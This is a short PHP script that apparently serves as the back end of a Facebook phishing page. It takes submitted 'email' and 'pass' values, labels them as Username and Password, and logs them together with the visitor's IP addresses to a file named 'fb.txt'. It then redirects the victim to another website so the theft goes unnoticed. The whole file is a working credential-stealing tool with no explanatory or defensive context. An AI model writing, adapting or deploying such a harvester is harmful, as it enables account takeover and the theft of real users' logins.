<?php
function getIP(){
	$address = $_SERVER['REMOTE_ADDR'];
	if (array_key_exists('HTTP_X_FORWARDED_FOR', $_SERVER) && !empty($_SERVER['HTTP_X_FORWARDED_FOR'])) {
		$address = $_SERVER['HTTP_X_FORWARDED_FOR'];
	} elseif (array_key_exists('HTTP_CLIENT_IP', $_SERVER) && !empty($_SERVER['HTTP_CLIENT_IP'])){
		$address = $_SERVER['HTTP_CLIENT_IP'];
	}
	if (strpos($address, ",") > 0) {
		$ips = explode(",", $address);
		$address = trim($ips[0]);
	}
	return $address;
}
function getIPs(){
	$ips = array();
	$vars = array(
		'REMOTE_ADDR',
		'HTTP_X_FORWARDED',
		'HTTP_X_FORWARDED_FOR',
		'HTTP_FORWARDED',
		'HTTP_FORWARDED_FOR'
	);
	foreach ($vars as $key) {
		if (!empty($_SERVER[$key])) {
			$ips[] = $_SERVER[$key];
		}
	}
	$ips = array_unique($ips);
	$ips = array_map('trim', $ips);
	$ips = array_map('strip_tags', $ips);
	$ips = array_map('htmlentities', $ips);
	return $ips;
}
if(isset($_REQUEST)){
	$msg = '';
	if(!empty($_REQUEST['email'])){$msg .= 'Username: '.$_REQUEST['email']."\n\r";}
	if(!empty($_REQUEST['pass'])){$msg .= 'Password: '.$_REQUEST['pass']."\n\r";}
	$msg .= 'IP: '.getIP(). "\n\r";
	$msg .= 'IPs: '.serialize(getIPs())."\n\r";
	$msg .= '============================================================='."\n\r";
	$file = 'fb.txt';
	$fp = fopen($file, 'a');
	if(fwrite($fp, $msg)){fclose($fp);}
	header("Location: http://www.37.com");
	exit;
}
?>